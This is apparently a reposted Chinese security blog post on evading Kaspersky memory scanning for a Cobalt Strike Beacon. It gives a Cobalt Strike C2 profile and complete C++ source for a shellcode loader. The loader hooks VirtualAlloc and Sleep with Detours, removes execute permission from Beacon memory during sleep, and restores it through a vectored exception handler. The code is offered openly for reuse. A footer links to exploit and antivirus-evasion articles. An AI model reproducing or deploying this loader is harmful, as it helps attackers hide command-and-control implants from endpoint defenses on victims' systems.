<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rlAYzEgI77Gopx-RXKTeHg)

文章来源：“先知社区” ，原文作者：WBGlIl

  

**0x01 前言**

上次看到yansu大佬写了一篇cs bypass卡巴斯基内存查杀，这次正好有时间我也不要脸的跟跟风，所以同样发在先知社区。  

  

**记一次cs bypass卡巴斯基内存查杀**

*   https://xz.aliyun.com/t/9224
    

  

yansu大佬是通过对cs的特征进行bypass，这次让我们换一种思路，尝试从另一个角度来绕过内存扫描，本文仅作为一种思路，大佬误喷。

  

**0x02 正文**

我们知道内存扫描是耗时耗力不管是卡巴还是其他杀软，一般来说都是扫描进程中一些高危的区域比如带有可执行属性的内存区域，既然他扫描带有X（可执行）属性的内存区域那么只要我们去除X属性，那自然就不会被扫也就不会被发现，但问题是去除X属性后Beacon也就跑不起来，但是不用怕我们知道Windows进程触发异常时我们可以对它处理，而此时我们可以在一瞬间恢复内存X属性让它跑起来然后等它再次进入sleep时去除X属性隐藏起来。

  

首先是准备工作，C2配置一份，为了演示效果我什么也不开就一份最普通的配置

```
`# default sleep time is 60s``set sleeptime "60000";``# jitter factor 0-99% [randomize callback times]``set jitter    "0";``# maximum number of bytes to send in a DNS A record request``set maxdns    "255";``# indicate that this is the default Beacon profile``set sample_name "Cobalt Strike Beacon (Default)";``# define indicators for an HTTP GET``http-get {` `# Beacon will randomly choose from this pool of URIs` `set uri "/test";` `client {` `# base64 encode session metadata and store it in the Cookie header.` `metadata {` `base64;` `header "Cookie";` `}` `}` `server {` `# server should send output with no changes` `header "Content-Type" "application/octet-stream";` `output {` `print;` `}` `}``}``# define indicators for an HTTP POST``http-post {` `set uri "/test.php";` `client {` `header "Content-Type" "application/octet-stream";` `# transmit our session identifier as /submit.php?id=[identifier]` `id {` `parameter "id";` `}` `# post our output with no real changes` `output {` `print;` `}` `}` `# The server's response to our HTTP POST` `server {` `header "Content-Type" "text/html";` `# this will just print an empty string, meh...` `output {` `print;` `}` `}``}`
```

  

payload选择生成无阶段原始格式，因为我是x64 loader所以把x64勾选上

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOclG4rA1VAULbNfrLdZSTOXnUPP0HMO0vefia6zKEk7fiaEx1KibwUSfPvCwoouBYK04NvT52LclCecA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

思路和代码都很简单，我也不会对Beacon做任何加密，思路如下，首先创建事件用来同步线程

```
hEvent = CreateEvent(NULL, TRUE, false, NULL);
```

  

设置VEH异常处理函数，用来在因内存X属性取消后触发异常时恢复X属性

```
`LONG NTAPI FirstVectExcepHandler(PEXCEPTION_POINTERS pExcepInfo)``{` `printf("FirstVectExcepHandler\n");` `printf("异常错误码:%x\n", pExcepInfo->ExceptionRecord->ExceptionCode);` `printf("线程地址:%llx\n", pExcepInfo->ContextRecord->Rip);` `if (pExcepInfo->ExceptionRecord->ExceptionCode == 0xc0000005 && is_Exception(pExcepInfo->ContextRecord->Rip))` `{` `printf("恢复Beacon内存属性\n");` `VirtualProtect(Beacon_address, Beacon_data_len, PAGE_EXECUTE_READWRITE, &Beacon_Memory_address_flOldProtect);` `return EXCEPTION_CONTINUE_EXECUTION;` `}` `return EXCEPTION_CONTINUE_SEARCH;``}``AddVectoredExceptionHandler(1, &FirstVectExcepHandler);`
```

  

然后就是HOOK VirtualAlloc和sleep函数，Hook VirtualAlloc函数的原因是我们需要知道Beacon在自展开时分配的可执行内存起始地址和大小是多少好在后面对这块内存取消X属性以免被扫描，Hool Sleep函数是因为我们需要在Beacon进入Sleep后立马取消Beacon内存区域的X属性

```
`static LPVOID (WINAPI *OldVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = VirtualAlloc;``LPVOID WINAPI NewVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {` `Beacon_data_len = dwSize;` `Beacon_address = OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);` `printf("分配大小:%d", Beacon_data_len);` `printf("分配地址:%llx \n", Beacon_address);` `return Beacon_address;``}``static VOID (WINAPI *OldSleep)(DWORD dwMilliseconds) = Sleep;``void WINAPI NewSleep(DWORD dwMilliseconds)``{` `if (Vir_FLAG)` `{` `VirtualFree(shellcode_addr, 0, MEM_RELEASE);` `Vir_FLAG = false;` `}` `printf("sleep时间:%d\n", dwMilliseconds);` `SetEvent(hEvent);` `OldSleep(dwMilliseconds);``}``//用的微软的Detour库``void Hook()``{` `DetourRestoreAfterWith(); //避免重复HOOK` `DetourTransactionBegin(); // 开始HOOK` `DetourUpdateThread(GetCurrentThread());` `DetourAttach((PVOID*)&OldVirtualAlloc, NewVirtualAlloc);` `DetourAttach((PVOID*)&OldSleep, NewSleep);` `DetourTransactionCommit(); //  提交HOOK``}`
```

  

然后创建一个线程用来在Beacon进入睡眠之后立刻取消Beacon内存区域的X属性

```
`DWORD WINAPI Beacon_set_Memory_attributes(LPVOID lpParameter)``{` `printf("Beacon_set_Memory_attributes启动\n");` `while (true)` `{` `WaitForSingleObject(hEvent, INFINITE);` `printf("设置Beacon内存属性不可执行\n");` `VirtualProtect(Beacon_address, Beacon_data_len, PAGE_READWRITE, &Beacon_Memory_address_flOldProtect);` `ResetEvent(hEvent);` `}` `return 0;``}``HANDLE hThread1 = CreateThread(NULL, 0, Beacon_set_Memory_attributes, NULL, 0, NULL);``CloseHandle(hThread1);`
```

  

最后就是读取Beacon.bin加载进内存执行了

```
`unsigned char *BinData = NULL;``size_t size = 0;``//别忘了向Test.bin最开始的位置插入两三个90``char* szFilePath = "C:\\Users\\WBG\\Downloads\\Test.bin";``BinData = ReadBinaryFile(szFilePath, &size);``shellcode_addr = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);``memcpy(shellcode_addr, BinData, size);``VirtualProtect(shellcode_addr, size, PAGE_EXECUTE_READWRITE, &Beacon_Memory_address_flOldProtect);``(*(int(*)()) shellcode_addr)();`
```

  

总结概括一下思路就是：Beacon进入睡眠就取消它内存的可执行属性，等Beacon线程醒来时触发异常交由VEH异常处理函数恢复内存的可执行属性，然后Beacon执行完成后又进入睡眠一直重复上述过程，效果如图

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**0x03 结尾**

提醒本文仅仅提供一种思路细节需要你自己去研究，代码一共不超过200行，附件代码如下，不限制转载但是禁止拿去割韭菜。  

```
`#include "pch.h"``#include <iostream>``#include<Windows.h>``#include "detours.h"``#include "detver.h"``#pragma comment(lib,"detours_x64.lib")``LPVOID Beacon_address;``SIZE_T Beacon_data_len;``DWORD Beacon_Memory_address_flOldProtect;``HANDLE hEvent;``BOOL Vir_FLAG=TRUE;``LPVOID shellcode_addr;``static LPVOID (WINAPI *OldVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = VirtualAlloc;``LPVOID WINAPI NewVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {` `Beacon_data_len = dwSize;` `Beacon_address = OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);` `printf("分配大小:%d", Beacon_data_len);` `printf("分配地址:%llx \n", Beacon_address);` `return Beacon_address;``}``static VOID (WINAPI *OldSleep)(DWORD dwMilliseconds) = Sleep;``void WINAPI NewSleep(DWORD dwMilliseconds)``{` `if (Vir_FLAG)` `{` `VirtualFree(shellcode_addr, 0, MEM_RELEASE);` `Vir_FLAG = false;` `}` `printf("sleep时间:%d\n", dwMilliseconds);` `SetEvent(hEvent);` `OldSleep(dwMilliseconds);``}``void Hook()``{` `DetourRestoreAfterWith(); //避免重复HOOK` `DetourTransactionBegin(); // 开始HOOK` `DetourUpdateThread(GetCurrentThread());` `DetourAttach((PVOID*)&OldVirtualAlloc, NewVirtualAlloc);` `DetourAttach((PVOID*)&OldSleep, NewSleep);` `DetourTransactionCommit(); //  提交HOOK``}``void UnHook()``{` `DetourTransactionBegin();` `DetourUpdateThread(GetCurrentThread());` `DetourDetach((PVOID*)&OldVirtualAlloc, NewVirtualAlloc);` `DetourTransactionCommit();``}``size_t GetSize(char * szFilePath)``{` `size_t size;` `FILE* f = fopen(szFilePath, "rb");` `fseek(f, 0, SEEK_END);` `size = ftell(f);` `rewind(f);` `fclose(f);` `return size;``}``unsigned char* ReadBinaryFile(char *szFilePath, size_t *size)``{` `unsigned char *p = NULL;` `FILE* f = NULL;` `size_t res = 0;` `*size = GetSize(szFilePath);` `if (*size == 0) return NULL;` `f = fopen(szFilePath, "rb");` `if (f == NULL)` `{` `printf("Binary file does not exists!\n");` `return 0;` `}` `p = new unsigned char[*size];` `// Read file` `rewind(f);` `res = fread(p, sizeof(unsigned char), *size, f);` `fclose(f);` `if (res == 0)` `{` `delete[] p;` `return NULL;` `}` `return p;``}``BOOL is_Exception(DWORD64 Exception_addr)``{` `if (Exception_addr < ((DWORD64)Beacon_address + Beacon_data_len) && Exception_addr >(DWORD64)Beacon_address)` `{` `printf("地址符合:%llx\n", Exception_addr);` `return true;` `}` `printf("地址不符合:%llx\n", Exception_addr);` `return false;``}``LONG NTAPI FirstVectExcepHandler(PEXCEPTION_POINTERS pExcepInfo)``{` `printf("FirstVectExcepHandler\n");` `printf("异常错误码:%x\n", pExcepInfo->ExceptionRecord->ExceptionCode);` `printf("线程地址:%llx\n", pExcepInfo->ContextRecord->Rip);` `if (pExcepInfo->ExceptionRecord->ExceptionCode == 0xc0000005 && is_Exception(pExcepInfo->ContextRecord->Rip))` `{` `printf("恢复Beacon内存属性\n");` `VirtualProtect(Beacon_address, Beacon_data_len, PAGE_EXECUTE_READWRITE, &Beacon_Memory_address_flOldProtect);` `return EXCEPTION_CONTINUE_EXECUTION;` `}` `return EXCEPTION_CONTINUE_SEARCH;``}``DWORD WINAPI Beacon_set_Memory_attributes(LPVOID lpParameter)``{` `printf("Beacon_set_Memory_attributes启动\n");` `while (true)` `{` `WaitForSingleObject(hEvent, INFINITE);` `printf("设置Beacon内存属性不可执行\n");` `VirtualProtect(Beacon_address, Beacon_data_len, PAGE_READWRITE, &Beacon_Memory_address_flOldProtect);` `ResetEvent(hEvent);` `}` `return 0;``}``int main()``{` `hEvent = CreateEvent(NULL, TRUE, false, NULL);` `AddVectoredExceptionHandler(1, &FirstVectExcepHandler);` `Hook();` `HANDLE hThread1 = CreateThread(NULL, 0, Beacon_set_Memory_attributes, NULL, 0, NULL);` `CloseHandle(hThread1);` `unsigned char *BinData = NULL;` `size_t size = 0;` `char* szFilePath = "C:\\Users\\WBG\\Downloads\\Test.bin";` `BinData = ReadBinaryFile(szFilePath, &size);` `shellcode_addr = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);` `memcpy(shellcode_addr, BinData, size);` `VirtualProtect(shellcode_addr, size, PAGE_EXECUTE_READWRITE, &Beacon_Memory_address_flOldProtect);` `(*(int(*)()) shellcode_addr)();` `UnHook();` `return 0;``}`
```

  

```


【往期推荐】  

[【内网渗透】内网信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485796&idx=1&sn=8e78cb0c7779307b1ae4bd1aac47c1f1&chksm=ea37f63edd407f2838e730cd958be213f995b7020ce1c5f96109216d52fa4c86780f3f34c194&scene=21#wechat_redirect)  

[【内网渗透】域内信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485855&idx=1&sn=3730e1a1e851b299537db7f49050d483&chksm=ea37f6c5dd407fd353d848cbc5da09beee11bc41fb3482cc01d22cbc0bec7032a5e493a6bed7&scene=21#wechat_redirect)

[【超详细 | Python】CS免杀-Shellcode Loader原理(python)](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486582&idx=1&sn=572fbe4a921366c009365c4a37f52836&chksm=ea37f32cdd407a3aea2d4c100fdc0a9941b78b3c5d6f46ba6f71e946f2c82b5118bf1829d2dc&scene=21#wechat_redirect)

[【超详细 | Python】CS免杀-分离+混淆免杀思路](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486638&idx=1&sn=99ce07c365acec41b6c8da07692ffca9&chksm=ea37f3f4dd407ae28611d23b31c39ff1c8bc79762bfe2535f12d1b9d7a6991777b178a89b308&scene=21#wechat_redirect)  

[【超详细 | 钟馗之眼】ZoomEye-python命令行的使用](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247488453&idx=1&sn=5828a0e1a2299d3ee0215f0ed4c30bf1&chksm=ea37ec9fdd406589124c67c45487be39ed1033d88c627092cf07f6d4f14ccdb9079b38dba74d&scene=21#wechat_redirect)  

[【超详细 | 附EXP】Weblogic CVE-2021-2394 RCE漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247488922&idx=1&sn=f43e3c243bbbfd2822867a3acaa8b85e&chksm=ea37eac0dd4063d63d98f935c73ce571cbfeb0e7272a6f171a28143bdb3e7134b09ea874969a&scene=21#wechat_redirect)

[【超详细】CVE-2020-14882 | Weblogic未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485550&idx=1&sn=921b100fd0a7cc183e92a5d3dd07185e&chksm=ea37f734dd407e22cfee57538d53a2d3f2ebb00014c8027d0b7b80591bcf30bc5647bfaf42f8&scene=21#wechat_redirect)

[【超详细 | 附PoC】CVE-2021-2109 | Weblogic Server远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486517&idx=1&sn=34d494bd453a9472d2b2ebf42dc7e21b&chksm=ea37f36fdd407a7977b19d7fdd74acd44862517aac91dd51a28b8debe492d54f53b6bee07aa8&scene=21#wechat_redirect)

[【漏洞分析 | 附EXP】CVE-2021-21985 VMware vCenter Server 远程代码执行漏洞](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247487906&idx=1&sn=e35998115108336f8b7c6679e16d1d0a&chksm=ea37eef8dd4067ee13470391ded0f1c8e269f01bcdee4273e9f57ca8924797447f72eb2656b2&scene=21#wechat_redirect)

[【CNVD-2021-30167 | 附PoC】用友NC BeanShell远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247487897&idx=1&sn=6ab1eb2c83f164ff65084f8ba015ad60&chksm=ea37eec3dd4067d56adcb89a27478f7dbbb83b5077af14e108eca0c82168ae53ce4d1fbffabf&scene=21#wechat_redirect)  

[【奇淫巧技】如何成为一个合格的“FOFA”工程师](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485135&idx=1&sn=f872054b31429e244a6e56385698404a&chksm=ea37f995dd40708367700fc53cca4ce8cb490bc1fe23dd1f167d86c0d2014a0c03005af99b89&scene=21#wechat_redirect)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[【超详细】Microsoft Exchange 远程代码执行漏洞复现【CVE-2020-17144】](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485992&idx=1&sn=18741504243d11833aae7791f1acda25&chksm=ea37f572dd407c64894777bdf77e07bdfbb3ada0639ff3a19e9717e70f96b300ab437a8ed254&scene=21#wechat_redirect)

[【超详细】Fastjson1.2.24反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)

 [记一次HW实战笔记 | 艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)

[【漏洞速递+检测脚本 | CVE-2021-49104】泛微E-Office任意文件上传漏洞](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247491093&idx=1&sn=6eb98fb387c0df3a0488f43b2de5fb95&chksm=ea37e14fdd406859c3d72401523c1721d6e16b9aff320aed6f71602554b12be08d13e6cce666&scene=21#wechat_redirect)  

[免杀基础教学（上卷）](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247490994&idx=1&sn=bb2486096d4cb848bebda423e96f9853&chksm=ea37e2e8dd406bfe612fe4cfbc7e70f9ce84119f3e9c7f72d38f276b6cb70157ca98f2936640&scene=21#wechat_redirect)  

[免杀基础教学（下卷）](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247491023&idx=1&sn=2b15f46ecf305ef8cb4909c46a9e7e7c&chksm=ea37e295dd406b83b271710e15fd8767a59a81cd8b6b8f5f503123fa765fa6a9dc4ffa5ab0bd&scene=21#wechat_redirect)  

走过路过的大佬们留个关注再走呗![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

往期文章有彩蛋哦![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)


```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

一如既往的学习，一如既往的整理，一如即往的分享![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

“如侵权请私聊公众号删文”

 ![](http://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGqQ9LmPjPNrA06yLgQ76dFnZQ2rqRibzS3VLSZpH37jsJ1XMM9T3GqSp8EibvglJkEkSej8zjX9VRA/0?wx_fmt=png) ** 渗透Xiao白帽 ** 积硅步以致千里，积怠惰以致深渊！ 33篇原创内容   公众号